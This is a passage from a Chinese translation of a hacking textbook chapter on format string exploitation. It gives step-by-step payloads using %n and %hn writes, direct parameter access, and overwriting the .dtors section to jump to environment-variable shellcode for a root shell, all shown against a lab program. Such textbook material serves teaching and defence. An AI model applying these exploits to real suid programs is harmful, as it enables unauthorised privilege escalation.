例如，让我们尝试将地址 `0xDDCCBBAA` 写入测试变量。在内存中，测试变量的第一个字节应该是 `0xAA`，然后是 `0xBB`，然后是 `0xCC`，最后是 `0xDD`。通过向内存地址 `0x08049794, 0x08049795, 0x08049796` 和 `0x08049797` 分别写入，应该能够完成这个操作。第一次写入将写入值 `0x000000aa`，第二次 `0x000000bb`，第三次 `0x000000cc`，最后 `0x000000dd`。

第一次写入应该很简单。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??%x%x%8x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc       0
[*] test_val @ 0x08049794 = 28 0x0000001c
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xaa - 28 + 8
$1 = 150
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%150x%n
The right way to print user-controlled input:
??%x%x%150x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
0
[*] test_val @ 0x08049794 = 170 0x000000aa 
reader@hacking:~/booksrc $
```

最后一个 `%x` 格式参数使用 8 作为字段宽度以标准化输出。这本质上是从堆中读取一个随机的 DWORD，它可以输出从 1 到 8 个字符。由于第一次覆盖将 28 放入 test_val，使用 150 作为字段宽度而不是 8 应该控制 test_val 的最低有效字节为 `0xAA`。

接下来是下一次写入。需要另一个参数来为另一个 `%x` 格式参数增加字节计数到 187，即十进制的 0xBB。这个参数可以是任何东西；它只需要是四个字节长，并且必须位于第一个任意内存地址 `0x08049754` 之后。由于这仍然是在格式字符串的内存中，它可以很容易地被控制。单词 *JUNK* 是四个字节长，将工作得很好。

之后，下一个要写入的内存地址 `0x08049755` 应该放入内存中，以便第二个 `%n` 格式参数可以访问它。这意味着格式字符串的起始部分应该由目标内存地址、四个字节的垃圾数据，然后是目标内存地址加一组成。但是，这些内存字节也会被格式函数打印出来，从而增加用于 `%n` 格式参数的字节计数器。这变得越来越复杂。

也许我们应该提前考虑格式字符串的起始部分。目标是进行四次写入。每次写入都需要传递一个内存地址，并且在这其中，需要四个字节的垃圾数据来正确增加 `%n` 格式参数的字节计数器。第一个 `%x` 格式参数可以使用在格式字符串本身之前找到的四个字节，但剩下的三个将需要提供数据。对于整个写入过程，格式字符串的起始部分应该看起来像这样：

![图片](img/httpatomoreillycomsourcenostarchimages254358.png.jpg)

图 0x300-4。

让我们试一试。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\
x96\
x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%8x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc       0
[*] test_val @ 0x08049794 = 52 0x00000034
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xaa - 52 + 8"
$1 = 126
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\
x96\
x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%126x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
0
[*] test_val @ 0x08049794 = 170 0x000000aa 
reader@hacking:~/booksrc $ 
```

格式字符串起始部分的地址和垃圾数据改变了 `%x` 格式参数所需的字段宽度选项的值。然而，这可以通过之前的方法轻松重新计算。另一种可能的方法是从之前的字段宽度值 150 中减去 24，因为格式字符串前面增加了 6 个新的 4 字节单词。

现在所有的内存都在格式字符串的起始部分设置好了，第二次写入应该很简单。

```
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xbb - 0xaa"
$1 = 17
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\
x96\
x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
   0         4b4e554a
[*] test_val @ 0x08049794 = 48042 0x0000bbaa 
reader@hacking:~/booksrc $
```

下一个期望的最低有效字节值是 `0xBB`。一个十六进制计算器很快就会显示在下一个 `%n` 格式参数之前需要写入 17 个字节。由于已经为 `%x` 格式参数设置了内存，使用字段宽度选项写入 17 个字节很简单。

这个过程可以重复进行第三次和第四次写入。

```
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcc - 0xbb"
$1 = 17
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xdd - 0xcc"
$1 = 17
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\
x96\
x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n%17x%n%17x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n%17x%n%17x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
   0         4b4e554a         4b4e554a         4b4e554a
[*] test_val @ 0x08049794 = -573785174 0xddccbbaa 
reader@hacking:~/booksrc $
```

通过控制最低有效字节并执行四次写入，可以写入任何内存地址的整个地址。需要注意的是，使用这种技术也会覆盖目标地址之后的三个字节。这可以通过在 `test_val` 之后立即静态声明另一个初始化变量 `next_val` 并在调试输出中显示此值来快速探索。这些更改可以在编辑器中或使用一些 `sed` 魔法来完成。

在这里，`next_val` 被初始化为值 `0x11111111`，因此写入操作对它的影响将很明显。

```
reader@hacking:~/booksrc $ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/
g;x;G}'
fmt_vuln.c > fmt_vuln2.c
reader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c
7c7
<    static int test_val = -72;
---
> static int test_val = -72, next_val = 0x11111111;
27a28
> printf("[*] next_val @ 0x%08x = %d 0x%08x\n", &next_val, next_val, next_val);
reader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c 
reader@hacking:~/booksrc $ ./fmt_vuln2 test
The right way:
test
The wrong way:
test
[*] test_val @ 0x080497b4 = -72 0xffffffb8
[*] next_val @ 0x080497b8 = 286331153 0x11111111
reader@hacking:~/booksrc $
```

如前所述的输出所示，代码更改也移动了 `test_val` 变量的地址。然而，`next_val` 显示出它紧邻 `test_val`。为了练习，让我们再次将地址写入变量 `test_val`，使用新的地址。

上次使用了一个非常方便的地址 `0xodccbbaa`。由于每个字节都大于前一个字节，因此很容易为每个字节增加字节计数器。但是，如果使用像 `0x0806abcd` 这样的地址呢？使用这个地址，`0xCD` 的第一个字节很容易通过 `%n` 格式参数写入，输出总共 205 个字节，字段宽度为 161。但是接下来要写入的下一个字节是 `0xAB`，需要输出 171 个字节。虽然很容易增加 `%n` 格式参数的字节计数器，但无法从中减去。

```
reader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x
The right way to print user-controlled input:
AAAA%x%x%x%x
The wrong way to print user-controlled input:
AAAAbffff3d0b7fe75fc041414141
[*] test_val @ 0x080497f4 = -72 0xffffffb8
[*] next_val @ 0x080497f8 = 286331153 0x11111111
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcd - 5"
$1 = 200
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%8x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc       0
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $ 
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%8x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc       0
[*] test_val @ 0x080497f4 = 52 0x00000034
[*] next_val @ 0x080497f8 = 286331153 0x11111111
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcd - 52 + 8"
$1 = 161
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
                                       0
[*] test_val @ 0x080497f4 = 205 0x000000cd
[*] next_val @ 0x080497f8 = 286331153 0x11111111
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xab - 0xcd"
$1 = -34 
reader@hacking:~/booksrc $
```

而不是尝试从 205 减去 34，最低有效字节通过将 205 加上 222 得到 427（这是 `0x1AB` 的十进制表示），被循环到 `0x1AB`。这种技术可以再次循环并设置第三次写入的最低有效字节为 `0x06`。

```
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x1ab - 0xcd"
$1 = 222
reader@hacking:~/booksrc $ gdb -q --batch -ex "p /d 0x1ab"
$1 = 427
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
                                       0
                                                      4b4e554a
[*] test_val @ 0x080497f4 = 109517 0x0001abcd
[*] next_val @ 0x080497f8 = 286331136 0x11111100
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x06 - 0xab"
$1 = -165
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x106 - 0xab"
$1 = 91
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
                                       0
                                                    4b4e554a
                           4b4e554a
[*] test_val @ 0x080497f4 = 33991629 0x0206abcd
[*] next_val @ 0x080497f8 = 286326784 0x11110000
reader@hacking:~/booksrc $
```

每次写入都会覆盖 `test_val` 旁边 `next_val` 变量的字节。循环技术似乎工作得很好，但在尝试最后一个字节时出现了一个小问题。

```
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x08 - 0x06"
$1 = 2
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%2x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%2x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3a0b7fe75fc
                                  0
                                                      4b4e554a
                           4b4e554a4b4e554a
[*] test_val @ 0x080497f4 = 235318221 0x0e06abcd
[*] next_val @ 0x080497f8 = 285212674 0x11000002 
reader@hacking:~/booksrc $
```

这里发生了什么？`0x06` 和 `0x08` 之间的差异只有两个，但输出了八个字节，导致 `%n` 格式参数写入了字节 `0x0e`。这是因为 `%x` 格式参数的字段宽度选项只是一个 *最小* 字段宽度，并且输出了八个字节的数据。这个问题可以通过再次循环来缓解；然而，了解字段宽度选项的限制是很好的。

```
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x108 - 0x06"
$1 = 258
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\
xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%258x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3a0b7fe75fc
                                  0
                                                      4b4e554a
                           4b4e554a
                                                                  4b4e554a
[*] test_val @ 0x080497f4 = 134654925 0x0806abcd
[*] next_val @ 0x080497f8 = 285212675 0x11000003
reader@hacking:~/booksrc $
```

就像之前一样，适当的地址和垃圾数据被放在格式字符串的开头，并且最低有效字节通过四次写入操作来控制，以覆盖变量 `test_val` 的所有四个字节。对最低有效字节的任何减值都可以通过循环字节来实现。同样，任何小于八的加法可能也需要以类似的方式循环。

## 直接参数访问

直接参数访问是一种简化格式字符串漏洞的方法。在之前的漏洞中，每个格式参数参数都必须按顺序遍历。这需要使用多个`%x`格式参数来遍历参数参数，直到达到格式字符串的开头。此外，顺序性质需要三个 4 字节的垃圾数据来正确地将一个地址写入任意内存位置。

正如其名所示，*直接参数访问*允许通过使用美元符号限定符直接访问参数。例如，`*%n``$d`会访问第*n*个参数并以十进制形式显示它。

```
printf("7th: %7$d, 4th: %4$05d \n", 10, 20, 30, 40, 50, 60, 70, 80);
```

前面的`printf()`调用将产生以下输出：

```
7th: 70, 4th: 00040
```

首先，当遇到格式参数`%7$d`时，数字`70`以十进制形式输出，因为第七个参数是 70。第二个格式参数访问第四个参数并使用字段宽度选项`05`。所有其他参数参数保持不变。这种直接访问方法消除了需要遍历内存直到找到格式字符串开头的需求，因为可以直接访问这段内存。以下输出显示了直接参数访问的使用。

```
reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
The right way to print user-controlled input:
AAAA%x%x%x%x
The wrong way to print user-controlled input:
AAAAbffff3d0b7fe75fc041414141
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
The right way to print user-controlled input:
AAAA%4$x
The wrong way to print user-controlled input:
AAAA41414141
[*] test_val @ 0x08049794 = -72 0xffffffb8 
reader@hacking:~/booksrc $
```

在这个例子中，格式字符串的开头位于第四个参数参数。而不是使用`%x`格式参数遍历前三个参数参数，可以直接访问这段内存。由于这是在命令行上进行的，而美元符号是一个特殊字符，因此必须使用反斜杠转义。这仅仅告诉命令 shell 避免尝试将美元符号解释为特殊字符。正确的格式字符串可以在打印时看到。

直接参数访问还简化了内存地址的编写。由于可以直接访问内存，因此不需要四个字节的垃圾数据空格来增加字节数输出计数。通常执行此功能的每个`%x`格式参数可以直接访问格式字符串之前找到的一块内存。为了练习，让我们使用直接参数访问将看起来更真实的地址`0xbffffd72`写入变量`test_val`s 中。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\
x08"
. "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
The right way to print user-controlled input:
????????%4$n
The wrong way to print user-controlled input:
????????
[*] test_val @ 0x08049794 = 16 0x00000010
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0x72 - 16
`$1 = 98`
(gdb) p 0xfd - 0x72
`$2 = 139`
(gdb) p 0xff - 0xfd
$3 = 2
(gdb) p 0x1ff - 0xfd
`$4 = 258`
(gdb) p 0xbf - 0xff
$5 = -64
(gdb) p 0x1bf - 0xff
`$6 = 192`
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\
x08"
. "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n
The right way to print user-controlled input:
????????%98x%4$n%139x%5$n
The wrong way to print user-controlled input:
????????
                                                                 bffff3c0
                                                 b7fe75fc
[*] test_val @ 0x08049794 = 64882 0x0000fd72
reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\
x08"
. "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
The right way to print user-controlled input:
????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
The wrong way to print user-controlled input:
???????? 
                                                                bffff3b0
                                                 b7fe75fc
                            0
                                   8049794
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
reader@hacking:~/booksrc $
```

由于不需要打印堆栈来达到我们的地址，第一个格式参数写入的字节数是 16。直接参数访问仅用于`%n`参数，因为对于`%x`空格参数使用的值实际上并不重要。这种方法简化了编写地址的过程，并缩小了必需的格式字符串大小。

## 使用简短写作

另一种可以简化格式字符串漏洞的技术是使用短写。通常，*短* 是一个双字节字，格式参数有特殊的方式来处理它们。有关可能的格式参数的更完整描述可以在 printf 手册页中找到。描述长度修饰符的部分如下所示。

```
	The length modifier
	    Here, integer conversion stands for d, i, o, u, x, or X conversion.

	    h      A following integer conversion corresponds to a short int or
	           unsigned short int argument, or a following n conversion
	           corresponds to a pointer to a short int argument.
```

这可以与格式字符串漏洞一起使用来写入双字节短整型。在下面的输出中，一个短整型（粗体显示）被写入四个字节 `test_val` 变量的两端。自然地，仍然可以直接访问参数。

```
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%hn
The right way to print user-controlled input:
??%x%x%x%hn
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = -65515 0xffff 0015
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%x%x%x%hn
The right way to print user-controlled input:
??%x%x%x%hn
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = 1441720  0x0015ffb8
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%4\$hn
The right way to print user-controlled input:
??%4$hn
The wrong way to print user-controlled input:
??
[*] test_val @ 0x08049794 = 327608 0x0004ffb8 
reader@hacking:~/booksrc $
```

使用短写，可以使用两个 `%hn` 参数覆盖整个四个字节的值。在下面的示例中，`test_val` 变量将被再次覆盖，地址为 `0xbffffd72`。

```
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xfd72 - 8
$1 = 64874
(gdb) p 0xbfff - 0xfd72
$2 = -15731
(gdb) p 0x1bfff - 0xfd72
$3 = 49805
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08\x96\x97\x04\x08")
%64874x%4\
$hn%49805x%5\$hn
The right way to print user-controlled input:
????%64874x%4$hn%49805x%5$hn
The wrong way to print user-controlled input:
b7fe75fc
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72 
reader@hacking:~/booksrc $
```

前面的示例使用了一个类似的环绕方法来处理 `0xbfff` 的第二次写入小于 `0xfd72` 的第一次写入。使用短写，写入的顺序并不重要，因此第一次写入可以是 `0xfd72`，第二次是 `0xbfff`，如果两个传递的地址在位置上交换。在下面的输出中，首先写入地址 `0x08049796`，然后写入地址 `0x08049794`。

```
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xfd72 - 0xbfff
$2 = 15731
(gdb) quit
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08\x94\x97\x04\x08")
%49143x%4\
$hn%15731x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%15731x%5$hn
The wrong way to print user-controlled input:
????

                                                       b7fe75fc
[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
reader@hacking:~/booksrc $
```

覆写任意内存地址的能力意味着能够控制程序的执行流程。一个选项是覆盖最近栈帧中的返回地址，就像在基于栈的溢出中所做的那样。虽然这是一个可能的选项，但还有其他具有更可预测内存地址的目标。基于栈的溢出性质仅允许覆盖返回地址，但格式字符串提供了覆盖任何内存地址的能力，这创造了其他可能性。

## 使用 .dtors 的旁路

在使用 GNU C 编译器编译的二进制程序中，为析构函数和构造函数分别创建了名为 `.dtors` 和 `.ctors` 的特殊表部分。构造函数在执行 `main()` 函数之前执行，析构函数在 `main()` 函数通过退出系统调用退出之前执行。析构函数和 `.dtors` 表部分特别引人关注。

函数可以通过定义析构属性来声明为析构函数，如 dtors_sample.c 中所示。

### dtors_sample.c

```
#include <stdio.h>
#include <stdlib.h>

static void cleanup(void) __attribute__ ((destructor));

main() {
   printf("Some actions happen in the main() function..\n");
   printf("and then when main() exits, the destructor is called..\n");

   exit(0);
}

void cleanup(void) {
   printf("In the cleanup function now..\n"); 
}
```

在前面的代码示例中，`cleanup()` 函数使用析构属性定义，因此当 `main()` 函数退出时，函数会自动调用，如下所示。

```
reader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c
reader@hacking:~/booksrc $ ./dtors_sample
Some actions happen in the main() function..
and then when main() exits, the destructor is called..
In the cleanup() function now.. 
reader@hacking:~/booksrc $
```

这种在退出时自动执行函数的行为是由二进制的 `.dtors` 表部分控制的。这个部分是一个以 NULL 地址结尾的 32 位地址数组。数组始终以 `0xffffffff` 开头，以 `0x00000000` 的 NULL 地址结束。在这两者之间是所有已声明具有析构属性的函数的地址。

可以使用 `nm` 命令找到 `cleanup()` 函数的地址，并使用 `objdump` 检查二进制的部分。

```
reader@hacking:~/booksrc $ nm ./dtors_sample
080495bc d _DYNAMIC
08049688 d _GLOBAL_OFFSET_TABLE_
080484e4 R _IO_stdin_used
         w _Jv_RegisterClasses
080495a8 d __CTOR_END__
080495a4 d __CTOR_LIST__ 
080495b4 d __DTOR_END__
080495ac d __DTOR_LIST__
080485a0 r __FRAME_END__
080495b8 d __JCR_END__
080495b8 d __JCR_LIST__
080496b0 A __bss_start
080496a4 D __data_start
08048480 t __do_global_ctors_aux
08048340 t __do_global_dtors_aux
080496a8 D __dso_handle
         w __gmon_start__
08048479 T __i686.get_pc_thunk.bx
080495a4 d __init_array_end
080495a4 d __init_array_start
08048400 T __libc_csu_fini
08048410 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
080496b0 A _edata
080496b4 A _end
080484b0 T _fini
080484e0 R _fp_hw
0804827c T _init
080482f0 T _start
08048314 t call_gmon_start
`080483e8 t cleanup`
080496b0 b completed.1
080496a4 W data_start
         U exit@@GLIBC_2.0
08048380 t frame_dummy
080483b4 T main
080496ac d p.0
         U printf@@GLIBC_2.0 
reader@hacking:~/booksrc $
```

`nm` 命令显示 `cleanup()` 函数位于 `0x080483e8`（如下所示加粗）。它还揭示了 `.dtors` 部分从 `0x080495ac` 开始以 `__DTOR_LIST__`（![](img/httpatomoreillycomsourcenostarchimages254530.png)）结束，并在 `0x080495b4`（![](img/httpatomoreillycomsourcenostarchimages254488.png)）结束。这意味着 `0x080495ac` 应该包含 `0xffffffff`，`0x080495b4` 应该包含 `0x00000000`，它们之间的地址（`0x080495b0`）应该包含 `cleanup()` 函数的地址（`0x080483e8`）。

`objdump` 命令显示了 `.dtors` 部分的实际内容（如下所示加粗），尽管格式略令人困惑。`80495ac` 的第一个值只是显示了 `.dtors` 部分所在的位置地址。然后显示了实际的字节，而不是 DWORD，这意味着字节是反向的。考虑到这一点，一切看起来都是正确的。

```
reader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample

./dtors_sample:     file format elf32-i386

Contents of section .dtors:
 80495ac `ffffffff e8830408 00000000`           ............
reader@hacking:~/booksrc $
```

关于 `.dtors` 部分的另一个有趣细节是它是可写的。通过显示 `.dtors` 部分未标记为 `READONLY`，对象转储将验证这一点。

```
reader@hacking:~/booksrc $ objdump -h ./dtors_sample

./dtors_sample:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .interp       00000013  08048114  08048114  00000114  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .note.ABI-tag 00000020  08048128  08048128  00000128  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .hash         0000002c  08048148  08048148  00000148  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .dynsym       00000060  08048174  08048174  00000174  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .dynstr       00000051  080481d4  080481d4  000001d4  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .gnu.version  0000000c  08048226  08048226  00000226  2**1
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  6 .gnu.version_r 00000020  08048234  08048234  00000234  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  7 .rel.dyn      00000008  08048254  08048254  00000254  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  8 .rel.plt      00000020  0804825c  0804825c  0000025c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  9 .init         00000017  0804827c  0804827c  0000027c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 10 .plt          00000050  08048294  08048294  00000294  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 11 .text         000001c0  080482f0  080482f0  000002f0  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 12 .fini         0000001c  080484b0  080484b0  000004b0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 13 .rodata       000000bf  080484e0  080484e0  000004e0  2**5
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 14 .eh_frame     00000004  080485a0  080485a0  000005a0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 15 .ctors        00000008  080495a4  080495a4  000005a4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 16 .dtors        0000000c  080495ac  080495ac  000005ac  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 17 .jcr          00000004  080495b8  080495b8  000005b8  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 18 .dynamic      000000c8  080495bc  080495bc  000005bc  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 19 .got          00000004  08049684  08049684  00000684  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 20 .got.plt      0000001c  08049688  08049688  00000688  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 21 .data         0000000c  080496a4  080496a4  000006a4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 22 .bss          00000004  080496b0  080496b0  000006b0  2**2
                  ALLOC
 23 .comment      0000012f  00000000  00000000  000006b0  2**0
                  CONTENTS, READONLY
 24 .debug_aranges 00000058  00000000  00000000  000007e0  2**3
                  CONTENTS, READONLY, DEBUGGING
 25 .debug_pubnames 00000025  00000000  00000000  00000838  2**0
                  CONTENTS, READONLY, DEBUGGING
 26 .debug_info   000001ad  00000000  00000000  0000085d  2**0
                  CONTENTS, READONLY, DEBUGGING
 27 .debug_abbrev 00000066  00000000  00000000  00000a0a  2**0
                  CONTENTS, READONLY, DEBUGGING
 28 .debug_line   0000013d  00000000  00000000  00000a70  2**0
                  CONTENTS, READONLY, DEBUGGING
 29 .debug_str    000000bb  00000000  00000000  00000bad  2**0
                  CONTENTS, READONLY, DEBUGGING
 30 .debug_ranges 00000048  00000000  00000000  00000c68  2**3
                  CONTENTS, READONLY, DEBUGGING 
reader@hacking:~/booksrc $
```

关于 `.dtors` 部分的另一个有趣细节是，它是所有使用 GNU C 编译器编译的二进制文件的一部分，无论是否声明了具有析构器属性的函数。这意味着易受攻击的格式字符串程序 fmt_vuln.c 必须有一个不包含任何内容的 `.dtors` 部分可以使用 `nm` 和 `objdump` 进行检查。

```
reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
08049694 d __DTOR_END__
08049690 d __DTOR_LIST__
reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln

./fmt_vuln:     file format elf32-i386

Contents of section .dtors:
 8049690 ffffffff 00000000                    ........
reader@hacking:~/booksrc $
```

如此输出所示，`__DTOR_LIST__` 和 `__DTOR_END__` 之间的距离这次只有四个字节，这意味着它们之间没有其他地址。对象转储验证了这一点。

由于 `.dtors` 部分是可写的，如果将 `0xffffffff` 之后的地址覆盖为内存地址，程序退出时程序执行流程将被导向该地址。这将是指向 `__DTOR_LIST__` 加四的地址，即 `0x08049694`（在这种情况下，这也恰好是 `__DTOR_END__` 的地址）。

如果程序是 suid root，并且这个地址可以被覆盖，那么将有可能获得 root shell。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at 0xbffff9ec
reader@hacking:~/booksrc $
```

Shellcode 可以放入环境变量中，地址可以像往常一样预测。由于辅助程序 getenvaddr.c 和易受攻击的 fmt_vuln.c 程序的文件名长度相差两个字节，当 fmt_vuln.c 执行时，Shellcode 将位于 `0xbffff9ec`。这个地址只需使用格式字符串漏洞将其写入 `.dtors` 部分的 `0x08049694`（如下所示加粗）即可。下面的输出中使用了简短写入方法。

```
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9ec - 0xbfff
$2 = 14829
(gdb) quit
reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
`08049694` d __DTOR_END__
08049690 d __DTOR_LIST__
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x96\x04\x08\x94\x96\x04\
x08")%49143x%4\$hn%14829x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%14829x%5$hn
The wrong way to print user-controlled input:
????

                                                        b7fe75fc
[*] test_val @ 0x08049794 = -72 0xffffffb8
